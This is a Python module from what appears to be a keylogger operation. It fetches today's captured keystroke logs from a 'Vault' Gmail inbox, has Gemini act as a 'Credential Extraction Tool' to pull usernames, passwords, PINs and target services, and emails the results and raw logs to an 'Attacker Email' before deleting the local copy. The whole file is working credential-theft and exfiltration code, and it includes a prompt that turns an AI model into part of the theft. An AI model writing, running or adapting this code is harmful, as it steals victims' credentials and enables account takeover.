"""
Module: Daily Aggregator & Analyzer
Description: 
    1. Connects to the 'Vault Email' (Mail 2).
    2. Fetches logs received from the 'Mule Email' (Mail 1) today.
    3. Aggregates data into a single file.
    4. Uses Gemini to extract credentials.
    5. Forwards the Intelligence Report to the 'Master Email' (Mail 3).
"""

from google import genai  
from email_service import EmailService
import config
import imaplib
import email
import datetime
import os

def fetch_todays_logs():
    """
    Connects to the Vault (Mail 2) and fetches all logs sent 
    by the Mule (Mail 1) since the start of the day.
    """
    print(f"[*] Connecting to Vault Email ({config.RAW_LOG_RECEIVER}) via IMAP...")
    
    try:
        
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        
        mail.login(config.RAW_LOG_RECEIVER, config.RAW_LOG_RECEIVER_PASSWORD)
        mail.select("inbox")
        
       
        today_str = datetime.date.today().strftime("%d-%b-%Y")
        
        # SEARCH CRITERIA: 
        # FROM: Mail 1 (Mule)
        # SUBJECT: "Security Project Log Update"
        # SINCE: Today
        search_criteria = f'(FROM "{config.RAW_LOG_SENDER}" SUBJECT "Security Project Log Update" SINCE "{today_str}")'
        status, messages = mail.search(None, search_criteria)
        
        email_ids = messages[0].split()
        print(f"[*] Found {len(email_ids)} log emails from today.")
        
        aggregated_logs = ""
        
        # Parse emails
        for e_id in email_ids:
            _, msg_data = mail.fetch(e_id, "(RFC822)")
            for response_part in msg_data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                body = part.get_payload(decode=True).decode()
                                aggregated_logs += body + "\n"
                    else:
                        body = msg.get_payload(decode=True).decode()
                        aggregated_logs += body + "\n"
        
        mail.logout()
        return aggregated_logs

    except Exception as e:
        print(f"[Error] IMAP Fetch failed: {e}")
        return ""

def run_daily_routine():
    # SETUP API 
    if not hasattr(config, 'API_KEY') or not config.API_KEY:
        print("[Error] API_KEY is missing in config.py")
        return
        
    try:
        # Initialize Client
        client = genai.Client(api_key=config.API_KEY)
    except Exception as e:
        print(f"[Error] Failed to configure AI: {e}")
        return

    #  FETCH LOGS
    raw_data = fetch_todays_logs()
    
    if not raw_data:
        print("[!] No logs found for today. Exiting.")
        return

    # CREATE CENTRALIZED LOG FILE
    filename = f"Daily_Log_{datetime.date.today()}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(raw_data)
    print(f"[*] Generated Centralized Log File: {filename}")

    # DEFINE PROMPT
    prompt = f"""
    You are a Credential Extraction Tool. 
    Analyze the aggregated keylogger data below.
    
    Extract ONLY: 
    - Potential Usernames / Emails
    - Potential Passwords
    - PIN Codes
    - Target Services (URLs/Apps)
    
    RAW DATA START:
    {raw_data[:30000]} 
    RAW DATA END
    
    If no credentials are found, simply state "No credentials detected."
    """
    
    # GENERATE & SEND 
    print("[*] Running AI Analysis...")
    try:

        response = client.models.generate_content(model='gemini-2.5-flash' , contents=prompt)
        analysis_text = response.text
        
        # Initialize Service as Mail 2 (The Vault)
        mailer = EmailService(config.RAW_LOG_RECEIVER, config.RAW_LOG_RECEIVER_PASSWORD)
        
        subject = f"Daily Intelligence Report - {datetime.date.today()}"
        
        print(f"[*] Sending Report to Attacker Email ({config.FINAL_REPORT_RECEIVER})...")
        
        # Send to Mail 3 (Attacker)
        success = mailer.send_email(
            receiver_email=config.FINAL_REPORT_RECEIVER,
            subject=subject,
            body=analysis_text,
            attachment_path=filename
        )
        
        if success:
            print("[*] Daily Routine Complete! Email sent.")
        
        # Cleanup
        if os.path.exists(filename):
            os.remove(filename)

    except Exception as e:
        print(f"[Error] Routine failed: {e}")

if __name__ == "__main__":
    run_daily_routine()